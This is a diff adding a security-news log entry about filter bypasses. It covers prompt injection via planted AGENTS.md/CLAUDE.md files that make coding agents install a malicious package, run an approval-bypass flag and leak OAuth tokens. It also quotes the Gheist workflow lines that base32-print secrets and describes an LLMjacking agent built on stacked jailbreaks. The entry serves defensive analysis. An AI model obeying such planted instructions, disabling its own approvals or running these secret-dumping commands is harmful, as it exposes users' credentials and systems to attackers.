@@ -5159,3 +5159,123 @@ not the technique.
 → [[vuln-supply]] [[disclosure-lag]] [[fact-check]] [[agent-stack]]
 
 Sources: [OpenAI — securing the frontier training environment](https://openai.com/index/securing-our-frontier-model-training-environment/) · [NVD CVE-2026-79845](https://nvd.nist.gov/vuln/detail/CVE-2026-79845) · [HPE advisory (JS shell)](https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbnw05162en_us&docLocale=en_US) · [Securelist — BlackX](https://securelist.com/uefi-bootkit-blackx/121539/) · [BleepingComputer — BlackX](https://www.bleepingcomputer.com/news/security/blackx-uefi-bootkit-exploits-baton-drop-flaw-to-bypass-secure-boot/)
+
+## 2026-10-26 12:17 batch — the instruction file is the payload, and the scrubber matches the wrong unit
+
+Four items in this batch are one shape: **the control that was supposed to stop it matches a string,
+and the attack changes the string.** Not one of them is a memory-safety bug; each is a filter whose
+unit of comparison is wrong.
+
+### `~/Downloads` + `AGENTS.md`: Markdown as the new executable (Forever Security, 2026-10-22)
+
+Caught live: a coding agent stopped mid-session installing **`function-color`** — and the order traced
+back to an **`AGENTS.md`** sitting in `~/Downloads`, the folder the session had been launched in. Two
+independently checkable facts anchor this: the package is a **security holding package** on npm
+(`0.0.1-security`, versions `1.0.0`/`1.7.3` withdrawn) carrying **`MAL-2026-17647` / `GHSA-m6cg-6crx-mggv`
+published 2026-10-07T20:49:08Z** on OSV, and the researchers' own reconstruction is a **13 KB**
+"Engineering Work Guidelines" document.
+
+- **Mechanism, per chain.** The Codex payload instructs the agent to append an
+  `mcp_servers.project-tools` block to **`~/.codex/config.toml`** whose command is
+  `launchctl submit … npm install function-color`, then to confirm with a child
+  `codex exec --dangerously-bypass-approvals-and-sandbox`. Three guardrails are defeated in prose:
+  the engineering-doc framing gets past the refusal a bare "install this package" triggers;
+  `launchctl` outlives Codex's server-handshake timeout; and the bypass flag is "**a flag the model
+  wrote itself, framed as needed for the install.**" Reported result: **more than 90%** of attempts.
+- **The second chain installs nothing.** A planted `CLAUDE.md` reroutes Claude Code's own API traffic
+  to a server with a valid certificate on a domain the researchers own, leaking the **OAuth token**,
+  then feeding back tool calls — "about **50%**" follow-through.
+- **Why neither vendor can patch it:** "**There is nothing here for OpenAI or Anthropic to patch. An
+  agent that follows the `AGENTS.md` in its folder is doing exactly what it was built to do**" — the
+  browser rendering a phishing page, working as designed. The root is an OS property: executables from
+  the internet stopped auto-running, but "**`~/Downloads` is special. It is the one folder the web can
+  write to on its own**," and an instruction file is not an executable.
+- **The persistence is machine-wide, which is the part to carry:** `~/.codex/config.toml` is not
+  folder-scoped, so "you can leave the folder. The poison stays" — every later session, any project,
+  loads the attacker's server at startup.
+- **Exposure measured by the firm, not asserted:** "about **half** of customers run a coding agent
+  inside their Downloads folder, and roughly a **quarter** of agent sessions open a real browser";
+  BleepingComputer adds that Claude Code alone "launched **more than 1,300 sessions** from that
+  location."
+- **Mitigation is behavioural and therefore will not be a default:** do not make `~/Downloads` a
+  working directory.
+
+### Gheist: base32 defeats the log scrubber (Wiz, 2026-10-25)
+
+Tracking since **15 September 2026**, the campaign commits `.github/workflows/sync-check.yml` on a
+branch named `ci-sync-` + six random characters, message `ci: sync config`, unsigned, authored as the
+token's owner. The workflow is `permissions: {}` and two lines:
+`env | base32 -w 120` and `echo -n '${{ toJSON(secrets) }}' | base32 -w 120`; the tool then pulls its
+own run log through the GitHub API and deletes the run seconds later. Recovered: **more than 13,500
+planted branches from more than 850 compromised accounts**.
+
+- **Three reasons it works, all about the unit:** GitHub "masks secret values in logs only when they
+  appear **verbatim**" — base32 does not match, so it prints in full; `permissions: {}` restricts
+  `GITHUB_TOKEN` but **not the `secrets` context**; and repos with deployment environments get a job
+  matrix over `environment: ${{ matrix.environment }}`, so production-scoped secrets print too.
+- **The exfil channel is GitHub's own API** — "no attacker domain or outbound connection to block."
+- **Its own published failure:** the `runs-on: self-hosted` variant (`sync-host`) sweeps for **31
+  token formats** (Anthropic, Hugging Face, Groq, NVIDIA), `/proc/*/environ`, the Docker socket, cloud
+  metadata and the K8s SA token — and "**is buggy: it looks for the wrong runner key file, its
+  URL-credential regex is broken, and it doesn't collect GCP or Azure**."
+- **State as of 2026-10-24:** a recent GitHub control blocks exploitation in **public** repos, but
+  exploitation and follow-on activity were observed in **private repos and GitHub Enterprise**
+  (CloudTrail shows the orgs' own workflows running on those branches and assuming AWS roles, i.e.
+  Actions executed without approval); the attack "is ongoing and evolving"; roughly **⅔ of implicated
+  accounts are no longer available** — response activity, not an ending.
+
+### LLMjacking gets its economics written down (Symantec, 2026-10-21)
+
+An **AI honeypot** impersonating an unauthenticated internet-facing model endpoint captured a whole
+working prompt from an operator who believed it was real. The agent hunts exposed
+**OpenAI-compatible endpoints** — self-hosted servers open by default, gateways/relays in front of paid
+accounts, internal test systems, and **MCP servers** — then scans, exploits (VS Code, Django, Jupyter,
+Laravel, Supabase, Next.js, Flask/Werkzeug debugger PIN), dumps databases through **Prisma**, harvests
+credentials, mines and reinfects. **74 callable offensive tool definitions**; "**Skynet mode**" was
+built "to run unattended for up to **100,000 steps**, executing tools without waiting for human
+approval"; honeypot telemetry recorded "**more than 127,000 external requests from tens of thousands
+of unique addresses**."
+
+- **The reusable part is not any tool; it is the wiring:** "The jailbreak layers were largely
+  **off-the-shelf**. Nothing in the individual techniques is new. What stands out is that someone
+  wired them into a single agent that hands the planning to a borrowed model and runs for up to
+  100,000 steps without a human" (Priti More, Symantec, to The Register). Five layers: identity
+  laundering → credential theft recast as routine dev work → a companion persona that treats refusal
+  as betrayal → dismissal of its own safety messages → the weapon list.
+- **Two victims, one silent:** "The owner of the exposed endpoint pays for the inference. Any server
+  the agent went on to break into would lose data and be put to work mining. We have **no evidence yet
+  that it got that far**" — while "the kit is **more than a prototype**," with tools working "against
+  a live target, with real-looking scan output."
+- **The operational conclusion:** an unauthenticated `/v1/chat/completions` is not a cost-control
+  failure; it is a compute donation with an agent attached.
+
+### The GHSA `cvss` field is a slot, and two of two advisories this batch leave it null
+
+- **Echo `GHSA-cxf3-9h37-7rr8`** (`labstack/echo`, Proxy middleware selects a raw tunnel on a
+  WebSocket upgrade before validating the upstream accepted it; `>= 4.0.0, < 4.16.1` and
+  `>= 5.0.0, < 5.4.1`, patched **4.16.1 / 5.4.1**; the missing validation exists in **v4.0.0**):
+  `severity: critical`, `cve_id: null`, `cvss: {vector_string: null, score: null}` — and
+  **`cvss_severities.cvss_v4` = 9.1**, `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`.
+  The repo page renders "Severity Critical **9.1** CVSS overall score". **The score exists; the legacy
+  field is null.** The repo advisory is dated **Oct 22**, the Advisory Database entry scanners read is
+  `published_at` **2026-10-23T20:49:37Z** — a day of lag nobody counts. The submission carries
+  "**This report was submitted with AI assistance**".
+- **Pillow `CVE-2026-112398` / `GHSA-5x8w-8jj5-q52h`**: same shape — `cvss` null,
+  `cvss_severities.cvss_v4` **9.2** (published 2026-10-23T21:55:21Z). FlashPix JPEG tiles decode as
+  `JCS_UNKNOWN` with **four components** into a mode-**LA two-byte-per-pixel** tile buffer
+  (`ImagingJpegDecode`, CWE-122/787), needing a crafted **OLE2 FlashPix** file and the optional
+  **`olefile`** dependency; fixed in **13.0.0**, released **2026-10-16T20:05:55Z** per `releases.atom`.
+- **The class is the route-bypass, and Echo has had it four times:** one CVE-identified issue
+  (`CVE-2026-55677`, encoded `%2F` bypassing route protection), a **27 September** batch of five
+  including one titled "incomplete fix", and six more on **22 October** — all "an alternative path to
+  a handler the router never sees." Its workaround line is a warning, not a fix: "**Merely returning a
+  non-101 response from the upstream does not prevent the vulnerable raw tunnel.**"
+- **Laravel `CVE-2026-114509` / `GHSA-f9x3-7vq9-cph6`**: TokenGuard "does not reject a crafted
+  non-string credential" and under affected **MySQL/MariaDB** configs the lookup "can match an
+  unintended existing user" — **9.2 v4.0** (`AV:N/AC:L/AT:P`), CWE-287/1287, NVD `Awaiting Analysis`
+  with 0 NVD metrics. Fixed in **12.68.0** and **13.29.0** (both **2026-08-25**, ~7h apart) against a
+  record published **2026-10-21** — **57 days** — and both branches have since moved to **12.70.1**
+  (2026-10-21) and **13.38.0** (2026-10-20), so the advisory's named patch commits are unreachable
+  from any version a team would install today.
+
+→ [[harness-reliability]] [[disclosure-lag]] [[vuln-supply]] [[fact-check]]
